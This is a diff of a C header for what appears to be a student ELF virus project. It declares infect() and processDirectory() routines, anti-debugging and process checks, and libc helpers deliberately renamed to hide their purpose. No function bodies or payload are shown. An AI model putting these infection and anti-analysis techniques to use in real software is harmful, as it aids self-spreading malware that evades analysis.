@@ -6,7 +6,7 @@
 /*   By: yyyyyy <yyyyyy@42.fr>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/08/01 17:16:00 by yyyyyy            #+#    #+#             */
-/*   Updated: 2026/02/11 17:07:26 by yyyyyy           ###   ########.fr       */
+/*   Updated: 2026/02/13 16:42:43 by yyyyyy           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -64,77 +64,81 @@ typedef struct s_elf
 /*
 void clean(t_file file);
 */
-void infect(char *path, void *begin_ptr);
-void processDirectory(char *folder, void *begin_ptr);
+static void infect(char *path, void *begin_ptr);
+static void processDirectory(char *folder, void *begin_ptr);
 
-int is_program_running(const char *target);
-int is_debugged(void);
-void signature(char str[]);
+static int is_program_running(const char *target);
+static int is_debugged(void);
+static void signature(char str[]);
 
 /**
 	@brief Obfuscated version of strncmp
 */
-int delay_calc(const char *timeout_ns, const char *timeout_ms, unsigned n);
+static int delay_calc(const char *timeout_ns, const char *timeout_ms,
+					  unsigned n);
 /**
 	@brief Obfuscated version of strlen
 */
-int validate_environment(const char *env_u);
+static int validate_environment(const char *env_u);
 /**
 	@brief Obfuscated version of strcmp
 */
-int delay_abs_calc(const char *s__, const char *s___);
+static int delay_abs_calc(const char *s__, const char *s___);
 /**
 	@brief Obfuscated version of memcpy content
 */
-void *memcat(void *buffered, void *rest, unsigned n);
+static void *memcat(void *buffered, void *rest, unsigned n);
 /**
 	@brief Obfuscated version of strchr
 */
-char *memoff(const char *l, int I);
+static char *memoff(const char *l, int I);
 /**
 	@brief Obfuscated version of memmove
 */
-void *cache_sync(void *cache_ptr, const void *sync_check, size_t sync_lvl);
+static void *cache_sync(void *cache_ptr, const void *sync_check,
+						size_t sync_lvl);
 /**
 	@brief Obfuscated version of strcpy
 */
-char *core_shift(char *value, char *src);
+static char *core_shift(char *value, char *src);
 /**
 	@brief Obfuscated version of strcat
 */
-char *flow_align(char *f_flow, char *s_flow);
+static char *flow_align(char *f_flow, char *s_flow);
 /**
 	@brief Obfuscated version of bzero
 */
-void context_purge(void *s, unsigned n);
+static void context_purge(void *s, unsigned n);
 /**
 	@brief Obfuscated version of atoi
 */
-int trace_depth(const char *str);
+static int trace_depth(const char *str);
 /**
 	@brief Obfuscated version of putchar
 */
-void tty_putc(char c);
+static void tty_putc(char c);
 /**
 	@brief Obfuscated version of putnbr
 */
-void fmt_u64_dec(unsigned long long elem);
+static void fmt_u64_dec(unsigned long long elem);
 /**
 	@brief Obfuscated version of a function that juste write 0x and call
    addr_emit
 */
-void emit_hex(unsigned long long n);
+static void emit_hex(unsigned long long n);
 /**
 	@brief Obfuscated version of hexa putnbr
 */
-void addr_emit(unsigned long long b);
+static void addr_emit(unsigned long long b);
 
 /**
 	@brief Obfuscated version of ft_syscall
 */
-uint64_t rt_vector(uint64_t syscall_number, uint64_t arg1, uint64_t arg2,
-				   uint64_t arg3, uint64_t arg4, uint64_t arg5, uint64_t arg6);
+static uint64_t rt_vector(uint64_t instr_tag, uint64_t heap_ctx,
+						  uint64_t exec_state, uint64_t io_ctx,
+						  uint64_t stack_ref, uint64_t guard_mask,
+						  uint64_t jitter_seed);
 
-void *memcpy(void *dst, void *src, unsigned n);
+static void *memcpy(void *dst, void *src, unsigned n);
 
 #endif
